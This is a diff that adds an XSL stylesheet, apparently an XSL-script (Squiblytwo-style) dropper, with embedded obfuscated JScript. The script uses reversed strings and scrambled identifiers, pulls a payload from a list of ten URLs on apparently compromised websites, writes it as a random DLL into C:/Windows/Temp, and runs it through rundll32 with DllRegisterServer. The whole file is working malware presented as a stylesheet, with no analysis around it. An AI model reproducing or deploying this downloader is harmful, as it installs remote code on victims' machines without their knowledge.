@@ -1,0 +1,90 @@
+<?xml version='1.0'?>
+<stylesheet
+xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" 
+xmlns:user="placeholder" 
+version="1.0">
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+function QYgwcfj_vfPiM5(Wy8h6ENeCMFytQSAx1JqVhjdA4){
+var Q1Gln9Ag9nuRrEsJ58f = ["QcqVDhukOrHXLoM3BYGWwjkEMQ","VtW17X7J_VAVPxEI_1XuRqk","HsfGKIc_Jv5y5jK_Wppa4y","xhNIhGb_HuwoWx8","OhfAR3WI_RImVxp_MBP1WE","kXsrDN7XTllJtEKJTQFBtg9da5","D52p6pd_NfBCPE_atq3sw_TV3V9HW","SYUQmLE_scFi6nP","Ttxg0dN_1tDqhE_f5YS8e_h7g9vx","GqTSKwT1vVGGplPrL3YP","SFuTNCnU_q0ei94P_c1p49P","QhbRM81K_0poi1eo_NVlfut","y00L0VPXCiYh9qFLe1Tk3V9sJab9","LbptZgVga7raMZ27f9Fzs6obI9","savetofile","Ec4nyVDMNnGy08","Xo60DIzleHyRvJMWtIXdMXcWiX","XUxTJE5spudJkFX","LfYLRI0y_HMtIyXn_mjLJMD","b8WM2FxBg885HOr",]
+return(Q1Gln9Ag9nuRrEsJ58f[Wy8h6ENeCMFytQSAx1JqVhjdA4]);}
+]]>
+</ms:script>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+function McyNJY90gWbYy9(NMWuoK9MYHrxIinl2g6v8mc48X4)
+{var oVQZLRiM_CtGtSF_JMG7wo = new Date().getTime();
+while (oVQZLRiM_CtGtSF_JMG7wo + NMWuoK9MYHrxIinl2g6v8mc48X4 >= new Date().getTime()){}}
+]]> </ms:script>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+var x8rmELnANmByNIgAV7hXzMAawE = ["m","a","e","r","t","s",".","b","d","o","d","a"].reverse().join("");
+McyNJY90gWbYy9(4559)
+function VqN6vAbyd0wzd(AlrsXCRG_cQIhzv4_wZ91Rr)
+{return new ActiveXObject(AlrsXCRG_cQIhzv4_wZ91Rr)};
+]]>
+</ms:script>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+var  eGCcWw0A_1zTtOP = [['http://www.yadfilmes.com/Lr2amfb5v2f.php', 'DllRegisterServer'], ['https://chainreactiondev.com/the-view/node_modules/node-gyp/test/fixtures/z8PrxpafJjjePCX.php', 'DllRegisterServer'], ['http://leavesofgooddeeds.com/wp-includes/js/tinymce/themes/inlite/HQfVfwoKlw4Qb.php', 'DllRegisterServer'], ['http://klimmen.com.br/wp-content/themes/one-page-express/customizer/kirki/includes/output/property/LLSbdJ41YThbnEI.php', 'DllRegisterServer'], ['https://amazecorp.com/CPGuzBUu.php', 'DllRegisterServer'], ['https://westend.org.ng/QtttntN3QzT3e3v.php', 'DllRegisterServer'], ['https://ok-one.biz/Pe3WeU5Vlvg.php', 'DllRegisterServer'], ['https://GesDoc.fda.com.pe/wp-content/plugins/members/addons/members-acf-integration/mvIU5C4mp.php', 'DllRegisterServer'], ['https://allnewtech.co.uk/wp-includes/sodium_compat/src/Core/Base64/JuacC698Hjwc9.php', 'DllRegisterServer'], ['http://tecnosystem2000.net/js/jquery/plugins/validate/localization/CgfSZE9rILr0.php', 'DllRegisterServer']]
+var XLKjs37rv21NMHCC71t = ["l","l","e","h","s"].reverse().join("");
+]]>
+</ms:script>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+var Ho4BQEmH_d0P3Ji2_7v0odO = "wscript.".concat(XLKjs37rv21NMHCC71t);
+]]>
+</ms:script>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+var Kb49NF8b7pVz9sXHs0r9kGURUoO = "G".concat(["T","E"].reverse().join(""))
+function YpdwBwG0AsiBTFO6PGIEKW(KHL9hcKYY0E6WzosnL0L)
+{var ghc3C92_0C7qmj_CiWQ3D = new VqN6vAbyd0wzd(Ho4BQEmH_d0P3Ji2_7v0odO)
+with (ghc3C92_0C7qmj_CiWQ3D){
+run(KHL9hcKYY0E6WzosnL0L)}}
+]]> </ms:script>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+var Bs99OW55_Is3Vut_Kigt5HL_92tqmd = ["0",".","6",".","p","t","t","h","l","m","x",".","2","l","m","x","s","m"].reverse().join("");
+function PLRySIke_aJUaZT7_LKLskA_OIk1cZn()
+{return Math.random().toString(36).substr(2, 5);};
+]]>
+</ms:script>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+function cxYCJKRcB1K10SPcCctGBEoKfQN(KC14tb0jpYcQ4a)
+{KC14tb0jpYcQ4a.open()}
+function AFPlJJfq5NeYJrd(oF7KQ1VsU5DNYu)
+{return oF7KQ1VsU5DNYu.status}
+]]>
+</ms:script>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+function QZf9IcmkbE1VLAuC2wPZek(YM5fdrzY0ye23uXFY9UvVP6pMvd)
+{return YM5fdrzY0ye23uXFY9UvVP6pMvd.readystate
+}]]>
+</ms:script>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+
+var V5fMbjJ_194h1aT_y04R3tm_kbhHFec = eGCcWw0A_1zTtOP.length;
+for (var i = 0; i < V5fMbjJ_194h1aT_y04R3tm_kbhHFec; i++)
+try{
+var LpqPBD8wuYZgtE = VqN6vAbyd0wzd(Bs99OW55_Is3Vut_Kigt5HL_92tqmd);
+var CUp0244_MJe2oG_1tYoADT_2It28M = VqN6vAbyd0wzd(x8rmELnANmByNIgAV7hXzMAawE);
+LpqPBD8wuYZgtE.open(Kb49NF8b7pVz9sXHs0r9kGURUoO, eGCcWw0A_1zTtOP[i][0], 0);
+LpqPBD8wuYZgtE.send();
+if (Number(AFPlJJfq5NeYJrd(LpqPBD8wuYZgtE))== 201-1 && Number(QZf9IcmkbE1VLAuC2wPZek(LpqPBD8wuYZgtE)) == 2+2+0-0){
+cxYCJKRcB1K10SPcCctGBEoKfQN(CUp0244_MJe2oG_1tYoADT_2It28M);
+CUp0244_MJe2oG_1tYoADT_2It28M.type = 1;
+CUp0244_MJe2oG_1tYoADT_2It28M.write(LpqPBD8wuYZgtE.responsebody);
+CUp0244_MJe2oG_1tYoADT_2It28M.position = 0;
+var AClUSkdN_DjHUQke_bEK263 = PLRySIke_aJUaZT7_LKLskA_OIk1cZn().concat(["l","l","d","."].reverse().join(""));
+var UNhAzjgkmbTOSoodgZMX =  "C:/Windows/Temp/".concat("/".concat(AClUSkdN_DjHUQke_bEK263))
+CUp0244_MJe2oG_1tYoADT_2It28M[QYgwcfj_vfPiM5(14)](UNhAzjgkmbTOSoodgZMX , 2);
+CUp0244_MJe2oG_1tYoADT_2It28M.close();
+YpdwBwG0AsiBTFO6PGIEKW("rundll32 ".concat(UNhAzjgkmbTOSoodgZMX.concat(" ".concat(eGCcWw0A_1zTtOP[i][1]))))
+break;}}
+catch(err){}
+]]> </ms:script>
+</stylesheet>
